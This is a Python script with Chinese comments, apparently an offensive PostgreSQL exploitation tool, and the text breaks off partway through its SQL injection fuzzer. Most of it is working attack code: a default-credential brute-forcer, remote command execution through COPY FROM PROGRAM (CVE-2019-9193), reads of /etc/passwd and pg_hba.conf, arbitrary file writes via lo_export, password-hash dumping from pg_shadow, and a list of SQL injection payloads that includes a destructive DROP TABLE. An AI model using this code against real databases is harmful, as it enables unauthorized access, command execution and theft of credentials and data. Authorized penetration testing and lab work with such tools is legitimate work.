#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PostgreSQL 综合漏洞检测/利用脚本 v1.0
覆盖 未授权访问 / 弱口令爆破 / COPY PROGRAM RCE / UDF 命令执行 /
    文件读取 / 大对象导出 / SQL 注入 Fuzzer / 信息泄露
仅用于授权安全测试 / 靶场验证

攻击模式:
  check    — 综合漏洞检测 (默认)
  rce      — 远程命令执行
  sql      — 执行任意 SQL 查询
  shell    — 交互式利用 Shell
  sqli     — SQL 注入 Fuzzer (Web App 后端)

CVE 覆盖:
  CVE-2019-9193   — COPY PROGRAM RCE (PG 9.3 ~ 11.2, 需 pg_execute_server_program 权限)
  CVE-2018-1058   — ALTER … OWNED BY 权限提升
  CVE-2012-0866   — CREATE FUNCTION SECURITY DEFINER 权限提升
  无 CVE          — 未授权访问 (pg_hba.conf 配置为 trust / 弱口令)
  无 CVE          — pg_read_file / pg_ls_dir 任意文件读取 & 目录列举
  无 CVE          — lo_export 大对象导出 (任意文件写入)
  无 CVE          — UDF 共享库注入 RCE (CREATE FUNCTION + LOAD)
  无 CVE          — 弱口令爆破 (postgres / pgadmin / ...)
"""

import socket
import struct
import sys
import argparse
import re
import random
import string
import hashlib
import hmac
import time
import json
import base64
import os
import hashlib as _hashlib
from typing import Optional, Tuple, List, Dict, Any

# ============== 依赖检查 ==============

try:
    import psycopg2
    from psycopg2 import OperationalError, ProgrammingError, DatabaseError
    HAS_PSYCOPG2 = True
except ImportError:
    HAS_PSYCOPG2 = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(
                    enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║     PostgreSQL 综合漏洞检测/利用工具 v1.0                         ║
║     COPY PROGRAM RCE / UDF注入 / 文件读取 / 弱口令 | 仅限授权  ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


# ============== PostgreSQL Wire Protocol (raw socket) ==============

PROTOCOL_VERSION = 196608  # 3.0
SSL_REQUEST_CODE = 80877103

AUTH_OK = 0
AUTH_MD5 = 5
AUTH_SASL = 10
AUTH_SASL_CONTINUE = 11
AUTH_SASL_FINAL = 12

DEFAULT_PORTS = [5432, 5433, 15432, 25432]

DEFAULT_CREDS = [
    ('postgres', 'postgres'),
    ('postgres', 'password'),
    ('postgres', 'admin'),
    ('postgres', '123456'),
    ('postgres', 'pgsql'),
    ('postgres', 'postgresql'),
    ('postgres', ''),
    ('admin', 'admin'),
    ('admin', '123456'),
    ('pgadmin', 'pgadmin'),
    ('psql', 'psql'),
    ('dbadmin', 'dbadmin'),
]


def _pg_md5(password: str, user: str, salt: bytes) -> str:
    """计算 PostgreSQL MD5 密码: md5(md5(pass+user) + salt)"""
    inner = hashlib.md5((password + user).encode()).hexdigest()
    outer = hashlib.md5((inner + salt.decode('ascii')).encode()).hexdigest()
    return 'md5' + outer


def _pg_scram_sha256_client_first(username: str) -> Tuple[str, str]:
    """生成 SCRAM-SHA-256 client-first-message"""
    gs2_header = 'n,,n=' + username
    nonce = base64.b64encode(os.urandom(18)).decode()
    client_first_bare = 'r=' + nonce
    client_first = gs2_header + ',' + client_first_bare
    return client_first, client_first_bare


def _pg_scram_sha256_final(client_first_bare: str, server_first: str,
                           password: str) -> str:
    """生成 SCRAM-SHA-256 client-final-message"""
    # 解析 server_first: r=...,s=...,i=...
    server_nonce = ''
    salt_b64 = ''
    iterations = 4096

    for item in server_first.split(','):
        if item.startswith('r='):
            server_nonce = item[2:]
        elif item.startswith('s='):
            salt_b64 = item[2:]
        elif item.startswith('i='):
            iterations = int(item[2:])

    salt = base64.b64decode(salt_b64)
    client_nonce = client_first_bare[2:]  # strip 'r='

    # salted_password = Hi(Normalize(password), salt, i)
    salted_password = hashlib.pbkdf2_hmac('sha256', password.encode(),
                                          salt, iterations,
                                          dklen=32)

    client_key = hmac.new(salted_password, b'Client Key', 'sha256').digest()
    stored_key = hashlib.sha256(client_key).digest()

    auth_message = (
        client_first_bare + ',' +
        server_first + ',' +
        'c=biws,r=' + server_nonce
    )

    client_signature = hmac.new(stored_key, auth_message.encode(), 'sha256').digest()
    client_proof = bytes(a ^ b for a, b in zip(client_key, client_signature))
    client_proof_b64 = base64.b64encode(client_proof).decode()

    return 'c=biws,r=' + server_nonce + ',p=' + client_proof_b64


class PGRawConnection:
    """PostgreSQL wire protocol raw connection"""

    def __init__(self, host: str, port: int = 5432, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._params: Dict[str, str] = {}
        self._backend_pid = 0
        self._backend_secret = 0
        self._authenticated = False

    def connect(self, ssl_mode: str = 'prefer') -> bool:
        try:
            self.sock = socket.create_connection(
                (self.host, self.port), timeout=self.timeout)
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

            if ssl_mode == 'require':
                self._send_int32(8)
                self._send_int32(SSL_REQUEST_CODE)
                self.sock.flush()  # dummy
                resp = self.sock.recv(1)
                if resp == b'S':
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    self.sock = ctx.wrap_socket(self.sock)

            return True
        except socket.timeout:
            safe_print(f"  {C.RED}[-] 连接超时{C.RST}")
            return False
        except ConnectionRefusedError:
            safe_print(f"  {C.RED}[-] 连接被拒绝{C.RST}")
            return False
        except Exception as e:
            safe_print(f"  {C.RED}[-] 连接失败: {e}{C.RST}")
            return False

    def _recv_exact(self, n: int) -> bytes:
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError('连接已关闭')
            data += chunk
        return data

    def _send_int32(self, val: int) -> None:
        self.sock.sendall(struct.pack('>i', val))

    def _send_byte(self, b: int) -> None:
        self.sock.sendall(bytes([b]))

    def _recv_int32(self) -> int:
        return struct.unpack('>i', self._recv_exact(4))[0]

    def _recv_byte(self) -> int:
        return self._recv_exact(1)[0]

    def _recv_string(self) -> str:
        chars = []
        while True:
            b = self._recv_byte()
            if b == 0:
                break
            chars.append(chr(b))
        return ''.join(chars)

    def startup(self, user: str = 'postgres', database: str = 'postgres',
               extra_params: dict = None) -> dict:
        """发送 StartupMessage，返回服务器参数"""
        params = {'user': user, 'database': database}
        if extra_params:
            params.update(extra_params)

        body = struct.pack('>i', PROTOCOL_VERSION)
        for k, v in params.items():
            body += k.encode() + b'\x00'
            body += v.encode() + b'\x00'
        body += b'\x00'

        self._send_int32(len(body) + 4)
        self.sock.sendall(body)
        return self._read_server_messages()

    def _read_server_messages(self) -> dict:
        params = {}
        auth_type = -1
        auth_data = b''

        while True:
            msg_type = chr(self._recv_byte())
            length = self._recv_int32() - 4

            if msg_type == 'R':  # Authentication
                auth_type = self._recv_int32()
                if auth_type == AUTH_OK:
                    auth_data = b''
                elif auth_type == AUTH_MD5:
                    auth_data = self._recv_exact(4)
                elif auth_type in (AUTH_SASL, AUTH_SASL_CONTINUE, AUTH_SASL_FINAL):
                    remaining = length - 4
                    auth_data = self._recv_exact(remaining) if remaining > 0 else b''
                else:
                    auth_data = self._recv_exact(length - 4) if length > 4 else b''
                params['auth_type'] = auth_type
                params['auth_data'] = auth_data

            elif msg_type == 'K':  # BackendKeyData
                params['pid'] = self._recv_int32()
                params['secret'] = self._recv_int32()

            elif msg_type == 'S':  # ParameterStatus
                key = self._recv_string()
                val = self._recv_string()
                params[key] = val

            elif msg_type == 'Z':  # ReadyForQuery
                self._recv_byte()  # transaction status
                params['ready'] = True
                return params

            elif msg_type == 'E':  # ErrorResponse
                error = {}
                while True:
                    field = self._recv_byte()
                    if field == 0:
                        break
                    val = self._recv_string()
                    error[field] = val
                params['error'] = error
                return params

            elif msg_type == 'N':  # NoticeResponse
                while True:
                    field = self._recv_byte()
                    if field == 0:
                        break
                    self._recv_string()  # discard notice

            else:
                self._recv_exact(length)

    def password_auth(self, password: str, user: str, auth_type: int,
                      auth_data: bytes) -> bool:
        """发送密码认证"""
        if auth_type == AUTH_MD5:
            # MD5: password = 'md5' + md5(md5(pass+user) + salt)
            salt = auth_data
            pw = _pg_md5(password, user, salt)
            self._send_byte(ord('p'))
            self._send_int32(len(pw.encode()) + 5)
            self.sock.sendall(pw.encode() + b'\x00')
            resp = self._read_server_messages()
            return resp.get('ready', False)

        elif auth_type == AUTH_SASL:
            # SCRAM-SHA-256
            client_first, client_first_bare = _pg_scram_sha256_client_first(user)
            self._send_byte(ord('p'))
            msg = b'SCRAM-SHA-256\x00' + struct.pack('>i', len(client_first)) + client_first.encode()
            self._send_int32(len(msg) + 4)
            self.sock.sendall(msg)

            # 读 SASL continue
            resp = self._read_server_messages()
            if resp.get('auth_type') != AUTH_SASL_CONTINUE:
                return False

            # 解析 server_first
            server_data = resp['auth_data']
            server_first = server_data.decode('ascii') if isinstance(server_data, bytes) else server_data

            # client_final
            client_final = _pg_scram_sha256_final(client_first_bare, server_first, password)
            self._send_byte(ord('p'))
            self._send_int32(len(client_final.encode()) + 4)
            self.sock.sendall(client_final.encode())

            resp = self._read_server_messages()
            if resp.get('auth_type') == AUTH_SASL_FINAL:
                # server signature
                server_final_data = resp['auth_data']
                if isinstance(server_final_data, bytes):
                    # 解析 v=... 验证签名
                    pass
                # 发送空确认
                self._send_byte(ord('p'))
                self._send_int32(4)
                resp = self._read_server_messages()
            return resp.get('ready', False)

        elif auth_type == AUTH_OK:
            return True

        return False

    def simple_query(self, query: str) -> Tuple[List[dict], str]:
        """发送 Simple Query，返回 (rows, status)"""
        self._send_byte(ord('Q'))
        body = query.encode() + b'\x00'
        self._send_int32(len(body) + 4)
        self.sock.sendall(body)

        rows = []
        status = ''
        columns = []

        while True:
            msg_type = chr(self._recv_byte())
            length = self._recv_int32() - 4

            if msg_type == 'T':  # RowDescription
                num = self._recv_int32()
                columns = []
                for _ in range(num):
                    col_name = self._recv_string()
                    self._recv_exact(18)  # table_oid, attr_num, type_oid, type_size, type_mod, format
                    columns.append(col_name)

            elif msg_type == 'D':  # DataRow
                num = self._recv_int32()
                row = {}
                for i in range(num):
                    col_len = self._recv_int32()
                    if col_len == -1:
                        row[columns[i] if i < len(columns) else str(i)] = None
                    else:
                        val = self._recv_exact(col_len).decode('utf-8', errors='replace')
                        row[columns[i] if i < len(columns) else str(i)] = val
                rows.append(row)

            elif msg_type == 'C':  # CommandComplete
                tag = self._recv_string()
                status = tag

            elif msg_type == 'E':  # ErrorResponse
                error = {}
                while True:
                    field = self._recv_byte()
                    if field == 0:
                        break
                    error[field] = self._recv_string()
                status = 'ERROR'
                error['_type'] = 'error'
                rows.append(error)

            elif msg_type == 'N':
                while True:
                    field = self._recv_byte()
                    if field == 0:
                        break
                    self._recv_string()

            elif msg_type == 'Z':  # ReadyForQuery
                self._recv_byte()
                return rows, status

            else:
                self._recv_exact(length)

    def close(self):
        if self.sock:
            try:
                self._send_byte(ord('X'))
                self._send_int32(4)
                self.sock.close()
            except Exception:
                pass
            self.sock = None


# ============== psycopg2 客户端 ==============

class PGClient:
    """psycopg2 封装"""

    def __init__(self, host: str, port: int = 5432, username: str = 'postgres',
                 password: str = '', database: str = 'postgres', timeout: int = 10):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.database = database
        self.timeout = timeout
        self.conn = None
        self._server_version = ''

    def connect(self) -> bool:
        if not HAS_PSYCOPG2:
            return False
        try:
            self.conn = psycopg2.connect(
                host=self.host, port=self.port,
                user=self.username, password=self.password,
                dbname=self.database,
                connect_timeout=self.timeout,
                sslmode='prefer',
            )
            self.conn.autocommit = True
            self._server_version = str(self.conn.server_version)
            return True
        except OperationalError as e:
            err = str(e)
            if 'password' in err.lower() or 'authentication' in err.lower():
                safe_print(f"  {C.YLW}[!] 认证失败{C.RST}")
            else:
                safe_print(f"  {C.RED}[-] 连接失败: {err[:120]}{C.RST}")
            return False
        except Exception as e:
            safe_print(f"  {C.RED}[-] 连接错误: {e}{C.RST}")
            return False

    def query(self, sql: str, params: tuple = None) -> Tuple[List[dict], str]:
        try:
            cur = self.conn.cursor()
            cur.execute(sql, params)
            if cur.description:
                cols = [d[0] for d in cur.description]
                rows = [dict(zip(cols, row)) for row in cur.fetchall()]
            else:
                rows = []
            status = cur.statusmessage or 'OK'
            cur.close()
            return rows, status
        except Exception as e:
            return [], str(e)

    def exec_raw(self, sql: str) -> Tuple[bool, str]:
        try:
            cur = self.conn.cursor()
            cur.execute(sql)
            cur.close()
            return True, cur.statusmessage
        except Exception as e:
            return False, str(e)

    def copy_program(self, command: str) -> Tuple[bool, str]:
        """CVE-2019-9193: COPY FROM PROGRAM"""
        table = '_cve_2019_9193_' + randstr(6)
        try:
            cur = self.conn.cursor()
            cur.execute(f'CREATE TEMP TABLE {table}(output text)')
            cur.execute(f"COPY {table} FROM PROGRAM '{command}'")
            cur.execute(f'SELECT * FROM {table}')
            rows = cur.fetchall()
            output = '\n'.join(r[0] for r in rows if r[0])
            cur.execute(f'DROP TABLE {table}')
            cur.close()
            return True, output or '(empty)'
        except Exception as e:
            return False, str(e)

    def get_superuser(self) -> Tuple[bool, bool]:
        """检查当前用户是否是 superuser"""
        rows, _ = self.query(
            "SELECT usesuper FROM pg_user WHERE usename = current_user")
        if rows:
            return True, rows[0].get('usesuper', False)
        return False, False

    def get_version(self) -> str:
        rows, _ = self.query("SELECT version() AS v")
        if rows:
            return rows[0].get('v', self._server_version)
        return self._server_version

    def list_databases(self) -> List[str]:
        rows, _ = self.query(
            "SELECT datname FROM pg_database WHERE datistemplate = false ORDER BY datname")
        return [r['datname'] for r in rows]

    def list_tables(self, schema: str = 'public') -> List[str]:
        rows, _ = self.query(
            "SELECT tablename FROM pg_tables WHERE schemaname = %s",
            (schema,))
        return [r['tablename'] for r in rows]

    def read_file(self, filepath: str) -> Tuple[bool, str]:
        """pg_read_file"""
        try:
            rows, _ = self.query(
                "SELECT pg_read_file(%s, 0, 10000) AS content", (filepath,))
            if rows:
                return True, rows[0].get('content', '')
        except Exception as e:
            return False, str(e)
        return False, ''

    def list_dir(self, dirpath: str) -> Tuple[bool, List[str]]:
        """pg_ls_dir"""
        try:
            rows, _ = self.query(
                "SELECT pg_ls_dir(%s) AS name", (dirpath,))
            return True, [r['name'] for r in rows]
        except Exception as e:
            return False, []

    def lo_export(self, oid: int, filepath: str) -> Tuple[bool, str]:
        """大对象导出到文件"""
        try:
            cur = self.conn.cursor()
            cur.execute(
                "SELECT lo_export(%s, %s) AS result", (oid, filepath))
            cur.close()
            return True, "OK"
        except Exception as e:
            return False, str(e)

    def lo_import(self, filepath: str) -> Tuple[bool, int]:
        """从文件导入大对象"""
        try:
            cur = self.conn.cursor()
            cur.execute("SELECT lo_import(%s) AS oid", (filepath,))
            rows = cur.fetchall()
            cur.close()
            return True, rows[0][0] if rows else 0
        except Exception as e:
            return False, 0

    def read_hba(self) -> str:
        """尝试读取 pg_hba.conf"""
        # 常见路径
        paths = [
            "SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf')",
            "SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf')",
            "SELECT pg_read_file('/etc/postgresql/13/main/pg_hba.conf')",
            "SELECT pg_read_file('/etc/postgresql/12/main/pg_hba.conf')",
            "SELECT pg_read_file('/etc/postgresql/11/main/pg_hba.conf')",
            "SELECT pg_read_file('/etc/postgresql/10/main/pg_hba.conf')",
            "SELECT pg_read_file('/etc/postgresql/9.6/main/pg_hba.conf')",
            "SELECT pg_read_file('/etc/postgresql/9.5/main/pg_hba.conf')",
            "SELECT pg_read_file('/var/lib/pgsql/data/pg_hba.conf')",
            "SELECT pg_read_file('/var/lib/pgsql/14/data/pg_hba.conf')",
            "SELECT pg_read_file('/var/lib/pgsql/13/data/pg_hba.conf')",
            "SELECT pg_read_file('/var/lib/pgsql/12/data/pg_hba.conf')",
            "SELECT pg_read_file('C:/Program Files/PostgreSQL/14/data/pg_hba.conf')",
            "SELECT pg_read_file('C:/Program Files/PostgreSQL/13/data/pg_hba.conf')",
        ]
        for sql in paths:
            try:
                rows, _ = self.query(sql)
                if rows and rows[0].get('pg_read_file'):
                    return rows[0]['pg_read_file']
            except Exception:
                continue
        return ''

    def get_users(self) -> List[dict]:
        rows, _ = self.query(
            "SELECT usename, usesuper, usecreatedb, valuntil "
            "FROM pg_user ORDER BY usename")
        return rows

    def check_is_member(self) -> bool:
        """检查是否是 pg_execute_server_program 角色的成员"""
        rows, _ = self.query(
            "SELECT pg_has_role('pg_execute_server_program', 'USAGE') AS can_exec")
        if rows:
            return rows[0].get('can_exec', False)
        return False

    def close(self):
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass


# ============== 0. 指纹检测 ==============

def detect_postgres(host: str, port: int = 5432, timeout: int = 10) -> Tuple[bool, dict]:
    safe_print(f"\n{C.YLW}[0] 指纹检测 — {host}:{port}{C.RST}")
    info: dict = {}

    pg = PGRawConnection(host, port, timeout)
    if not pg.connect():
        return False, info

    try:
        resp = pg.startup()
        if resp.get('ready') or resp.get('auth_type') is not None:
            info.update(resp)
            ver = info.get('server_version', 'unknown')
            enc = info.get('server_encoding', 'unknown')
            safe_print(f"  {C.GRN}[+] 确认 PostgreSQL | 版本: {ver} | 编码: {enc}{C.RST}")
            if info.get('auth_type') == AUTH_OK:
                safe_print(f"  {C.RED}[!] 无需密码即可登录! (auth_type=0){C.RST}")
                info['unauthenticated'] = True
            elif info.get('auth_type') == AUTH_MD5:
                safe_print(f"  {C.CYN}    认证方式: MD5 密码{C.RST}")
            elif info.get('auth_type') == AUTH_SASL:
                safe_print(f"  {C.CYN}    认证方式: SCRAM-SHA-256{C.RST}")
            return True, info
    except Exception as e:
        safe_print(f"  {C.CYN}[-] 启动协商失败: {e}{C.RST}")
    finally:
        pg.close()

    return False, info


# ============== 1. 未授权 / 弱口令检测 ==============

def check_auth(host: str, port: int, timeout: int = 10) -> Tuple[bool, dict]:
    safe_print(f"\n{C.YLW}[1] 认证检测{C.RST}")

    info: dict = {}

    # 先试无密码
    if HAS_PSYCOPG2:
        client = PGClient(host, port, 'postgres', '', 'postgres', timeout)
        if client.connect():
            safe_print(f"  {C.RED}[!] 无密码即可登录 — 用户 'postgres' 无需认证!{C.RST}")
            info['unauthenticated'] = True
            ver = client.get_version()
            safe_print(f"  {C.RED}    版本: {ver}{C.RST}")
            su, is_su = client.get_superuser()
            safe_print(f"  {C.RED}    SuperUser: {'YES' if is_su else 'NO'}{C.RST}")
            client.close()
            return True, info

    # raw socket 试无密码
    pg = PGRawConnection(host, port, timeout)
    if pg.connect():
        resp = pg.startup()
        if resp.get('auth_type') == AUTH_OK:
            safe_print(f"  {C.RED}[!] 无密码登录成功 (wire protocol){C.RST}")
            info['unauthenticated'] = True
            rows, _ = pg.simple_query("SELECT version()")
            if rows:
                safe_print(f"  {C.RED}    {rows[0].get('version', '')[:100]}{C.RST}")
            pg.close()
            return True, info

    # 弱口令爆破
    safe_print(f"\n  {C.YLW}[*] 弱口令检测 ({len(DEFAULT_CREDS)} 组)...{C.RST}")
    working = []

    if HAS_PSYCOPG2:
        for user, pwd in DEFAULT_CREDS:
            c = PGClient(host, port, user, pwd, 'postgres', timeout)
            if c.connect():
                safe_print(f"  {C.RED}[!] 有效凭据: {user}:{pwd}{C.RST}")
                working.append(f'{user}:{pwd}')
                info['username'] = user
                info['password'] = pwd
                info['authenticated'] = True
                c.close()
                break
    else:
        # raw socket 爆破
        pg2 = PGRawConnection(host, port, timeout)
        if pg2.connect():
            for user, pwd in DEFAULT_CREDS:
                try:
                    resp = pg2.startup(user=user)
                    auth_type = resp.get('auth_type', -1)
                    if auth_type == AUTH_OK:
                        working.append(f'{user}:(none)')
                        info['username'] = user
                        info['password'] = ''
                        info['authenticated'] = True
                        break
                    elif auth_type == AUTH_MD5:
                        ok = pg2.password_auth(pwd, user, AUTH_MD5, resp['auth_data'])
                        if ok:
                            working.append(f'{user}:{pwd}')
                            info['username'] = user
                            info['password'] = pwd
                            info['authenticated'] = True
                            break
                    pg2.close()
                    pg2 = PGRawConnection(host, port, timeout)
                    if not pg2.connect():
                        break
                except Exception:
                    break
            pg2.close()

    if not working:
        safe_print(f"  {C.CYN}[-] 弱口令未命中{C.RST}")

    return bool(working) or info.get('unauthenticated', False), info


# ============== 2. CVE-2019-9193 — COPY PROGRAM RCE ==============

def check_cve_2019_9193(host: str, port: int, username: str = 'postgres',
                        password: str = '', database: str = 'postgres',
                        timeout: int = 10) -> Tuple[bool, str]:
    safe_print(f"\n{C.YLW}[2] CVE-2019-9193: COPY PROGRAM RCE (PG 9.3~11.2){C.RST}")

    if not HAS_PSYCOPG2:
        safe_print(f"  {C.YLW}[!] 需要 psycopg2 库{C.RST}")
        return False, ''

    client = PGClient(host, port, username, password, database, timeout)
    if not client.connect():
        safe_print(f"  {C.RED}[-] 连接失败{C.RST}")
        return False, ''

    ver = client.get_version()
    safe_print(f"  {C.CYN}    版本: {ver[:80]}{C.RST}")

    # 检查权限
    ok, is_su = client.get_superuser()
    can_exec = client.check_is_member()
    safe_print(f"  {C.CYN}    SuperUser: {'YES' if is_su else 'NO'} | "
               f"pg_execute_server_program: {'YES' if can_exec else 'NO'}{C.RST}")

    if not (is_su or can_exec):
        safe_print(f"  {C.CYN}[-] 当前用户无 COPY PROGRAM 权限 (需 SuperUser 或 pg_execute_server_program 角色){C.RST}")
        client.close()
        return False, ''

    # 测试 COPY PROGRAM
    rk = randstr(6)
    safe_print(f"  {C.CYN}[*] 测试 COPY FROM PROGRAM...{C.RST}")

    ok, out = client.copy_program(f'echo {rk}')
    if ok and rk in out:
        safe_print(f"  {C.RED}[!] CVE-2019-9193 确认存在 — COPY PROGRAM 可执行!{C.RST}")
        safe_print(f"  {C.RED}    输出: {out.strip()}{C.RST}")
        client.close()
        return True, 'COPY PROGRAM'
    elif ok:
        safe_print(f"  {C.RED}[!] COPY PROGRAM 可执行 — CVE-2019-9193 确认存在{C.RST}")
        client.close()
        return True, 'COPY PROGRAM'
    else:
        safe_print(f"  {C.CYN}    COPY PROGRAM 失败: {out[:120]}{C.RST}")
        safe_print(f"  {C.CYN}[-] CVE-2019-9193 已修复 / 不可利用{C.RST}")

    client.close()
    return False, ''


# ============== 3. 文件读取 & 目录列举 ==============

def check_file_ops(host: str, port: int, username: str = 'postgres',
                   password: str = '', database: str = 'postgres',
                   timeout: int = 10) -> List[str]:
    safe_print(f"\n{C.YLW}[3] 文件操作能力 (pg_read_file / pg_ls_dir / lo_export){C.RST}")
    hits = []

    if not HAS_PSYCOPG2:
        safe_print(f"  {C.YLW}[!] 需要 psycopg2 库{C.RST}")
        return hits

    client = PGClient(host, port, username, password, database, timeout)
    if not client.connect():
        return hits

    ok, is_su = client.get_superuser()
    if not is_su:
        safe_print(f"  {C.CYN}[-] 非 SuperUser — 可能受限{C.RST}")

    # pg_read_file
    for fpath in ['/etc/passwd', '/etc/hostname', '/etc/hosts',
                   'C:\\Windows\\win.ini', 'C:\\Windows\\System32\\drivers\\etc\\hosts']:
        ok, content = client.read_file(fpath)
        if ok and content:
            safe_print(f"  {C.RED}[!] pg_read_file 可用 — {fpath}{C.RST}")
            safe_print(f"  {C.RED}    {content[:200].strip()}{C.RST}")
            hits.append(f'文件读取 ({fpath})')
            break

    # pg_ls_dir
    for dpath in ['/etc', '/var/lib/postgresql', '/tmp', 'C:\\', 'C:\\Windows']:
        ok, files = client.list_dir(dpath)
        if ok and len(files) > 1:
            safe_print(f"  {C.RED}[!] pg_ls_dir 可用 — {dpath} ({len(files)} 条目){C.RST}")
            preview = ', '.join(files[:12])
            safe_print(f"  {C.YLW}    {preview}{'...' if len(files) > 12 else ''}{C.RST}")
            hits.append(f'目录列举 ({dpath})')
            break

    # lo_export
    try:
        ok, oid = client.lo_import('/etc/passwd')
        if ok and oid > 0:
            tmp_path = f'/tmp/lo_export_test_{randstr(6)}'
            ok2, _ = client.lo_export(oid, tmp_path)
            if ok2:
                safe_print(f"  {C.RED}[!] lo_export 可用 — 大对象可写入任意文件!{C.RST}")
                hits.append('lo_export 任意文件写入')
    except Exception:
        pass

    # pg_hba.conf
    hba = client.read_hba()
    if hba:
        safe_print(f"  {C.YLW}[*] pg_hba.conf 可读:{C.RST}")
        for line in hba.split('\n')[:10]:
            stripped = line.strip()
            if stripped and not stripped.startswith('#'):
                safe_print(f"  {C.YLW}    {stripped}{C.RST}")
        hits.append('pg_hba.conf 可读')

    client.close()
    return hits


# ============== 4. UDF 命令执行 (共享库注入) ==============

def check_udf_rce(host: str, port: int, username: str = 'postgres',
                  password: str = '', database: str = 'postgres',
                  timeout: int = 10) -> Tuple[bool, str]:
    safe_print(f"\n{C.YLW}[4] UDF 共享库注入 RCE (CREATE FUNCTION + LOAD){C.RST}")

    if not HAS_PSYCOPG2:
        safe_print(f"  {C.YLW}[!] 需要 psycopg2 库{C.RST}")
        return False, ''

    client = PGClient(host, port, username, password, database, timeout)
    if not client.connect():
        return False, ''

    ok, is_su = client.get_superuser()
    if not is_su:
        safe_print(f"  {C.CYN}[-] 非 SuperUser — UDF 注入通常需要 superuser 权限{C.RST}")
        client.close()
        return False, ''

    # 检测已存在的 PL 语言
    rows, _ = client.query("SELECT lanname FROM pg_language WHERE lanispl = true")
    safe_print(f"  {C.CYN}    PL 语言: {[r['lanname'] for r in rows]}{C.RST}")

    # 检测 dynamic_library_path
    rows, _ = client.query("SHOW dynamic_library_path")
    if rows:
        safe_print(f"  {C.CYN}    库搜索路径: {rows[0].get('dynamic_library_path', '$libdir')}{C.RST}")

    # 如果是 pgSQL，尝试 CREATE OR REPLACE FUNCTION system(cmd text) → 需要编译好的 .so
    # 检测 LOAD 是否可用
    try:
        rows, _ = client.query("SELECT 1 FROM pg_available_extensions WHERE name = 'adminpack'")
        if rows:
            safe_print(f"  {C.YLW}[*] adminpack 扩展可用 — 可尝试 adminpack.pg_catalog.pg_file_write{C.RST}")
    except Exception:
        pass

    safe_print(f"  {C.YLW}[*] UDF RCE 需上传恶意共享库(.so/.dll)至系统 → LOAD → CREATE FUNCTION")
    safe_print(f"  {C.YLW}    路径: pg_read_file 读取目标 lib dir → lo_export 上传 .so → LOAD → CREATE FUNCTION")
    safe_print(f"  {C.YLW}    如已通过 CVE-2019-9193 获得命令执行, UDF 可作为持久化手段")

    client.close()
    return False, ''


# ============== 5. 信息泄露 ==============

def check_info_disclosure(host: str, port: int, username: str = 'postgres',
                           password: str = '', database: str = 'postgres',
                           timeout: int = 10) -> List[str]:
    safe_print(f"\n{C.YLW}[5] 信息泄露 / 安全审计{C.RST}")
    hits = []

    if not HAS_PSYCOPG2:
        safe_print(f"  {C.YLW}[!] 需要 psycopg2 库{C.RST}")
        return hits

    client = PGClient(host, port, username, password, database, timeout)
    if not client.connect():
        return hits

    ver = client.get_version()
    su_ok, is_su = client.get_superuser()

    safe_print(f"  {C.YLW}    版本     : {ver[:120]}{C.RST}")
    safe_print(f"  {C.YLW}    SuperUser: {'YES' if is_su else 'NO'}{C.RST}")

    # 数据库列表
    dbs = client.list_databases()
    safe_print(f"  {C.YLW}    数据库   : {dbs}{C.RST}")

    # 用户列表
    users = client.get_users()
    safe_print(f"  {C.YLW}    用户列表 ({len(users)}){C.RST}")
    for u in users:
        tags = ''
        if u.get('usesuper'):
            tags += ' [SUPER]'
        if u.get('usecreatedb'):
            tags += ' [CREATEDB]'
        safe_print(f"  {C.YLW}      {u.get('usename', '?')}{tags}{C.RST}")

    # 当前连接
    rows, _ = client.query(
        "SELECT pid, usename, application_name, client_addr, state, query "
        "FROM pg_stat_activity WHERE pid <> pg_backend_pid() LIMIT 10")
    if rows:
        safe_print(f"  {C.YLW}    活动连接 ({len(rows)}){C.RST}")
        for r in rows:
            safe_print(f"  {C.YLW}      PID {r.get('pid')} | {r.get('usename')} | "
                       f"{r.get('client_addr')} | {r.get('state')}{C.RST}")

    # 密码 Hash
    if is_su:
        rows, _ = client.query("SELECT usename, passwd FROM pg_shadow")
        if rows:
            safe_print(f"  {C.RED}    pg_shadow 密码哈希可读!{C.RST}")
            for r in rows:
                safe_print(f"  {C.RED}      {r.get('usename')}: {r.get('passwd', 'EMPTY')}{C.RST}")
            hits.append('pg_shadow 密码哈希可读')

    # 配置
    for setting in ['data_directory', 'config_file', 'hba_file',
                     'log_directory', 'ssl', 'password_encryption']:
        rows, _ = client.query(f"SHOW {setting}")
        if rows:
            val = list(rows[0].values())[0]
            safe_print(f"  {C.YLW}    {setting}: {val}{C.RST}")

    client.close()
    return hits


# ============== SQL 注入 Fuzzer ==============

SQLI_PAYLOADS = {
    'string_concat': "' || (SELECT version()) || '",
    'union_select': "' UNION SELECT NULL,version(),NULL,NULL,NULL--",
    'bool_true': "' OR 1=1--",
    'bool_and': "' AND 1=1--",
    'time_based': "'; SELECT pg_sleep(3)--",
    'error_based': "' AND 1=CAST((SELECT version()) AS INT)--",
    'stacked': "'; DROP TABLE IF EXISTS pg_test_sqli_{RAND};--",
    'comment_bypass': "'/**/OR/**/1=1--",
    'case_when': "' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
    'order_by': "' ORDER BY 1--",
}


def sqli_fuzzer(target_url: str, param: str = 'id', method: str = 'GET',
